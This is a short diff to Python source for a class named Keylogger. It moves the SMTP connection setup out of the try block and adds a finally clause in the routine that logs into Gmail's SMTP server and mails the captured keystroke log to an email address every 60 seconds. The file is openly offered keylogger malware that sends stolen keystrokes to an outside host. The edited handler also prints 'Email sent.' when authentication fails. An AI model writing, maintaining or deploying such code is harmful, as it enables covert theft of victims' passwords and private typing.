@@ -5,7 +5,7 @@ from threading import Timer
 
 EMAIL_ADDRESS = "YOUR_EMAIL"
 EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
-SEND_REPORT_EVERY = 60  # as in seconds
+SEND_REPORT_EVERY = 60  # seconds
 EMAIL_HOST = "smtp.gmail.com"
 PORT = 587
 
@@ -37,15 +37,16 @@ class Keylogger:
         self.update_log(name.replace("'", ""))
 
     def send_email(self):
+        server = SMTP(host=EMAIL_HOST, port=PORT)
+        # connect to the SMTP server as TLS mode
+        server.starttls()
         try:
-            server = SMTP(host=EMAIL_HOST, port=PORT)
-            # connect to the SMTP server as TLS mode
-            server.starttls()
             server.login(self.email, self.password)
             server.sendmail(self.email, self.email, f"\n\n{self.log}")
-            server.quit()
         except SMTPAuthenticationError:
             print("Email sent.")
+        finally:
+            server.quit()
 
     def report(self):
         self.send_email()
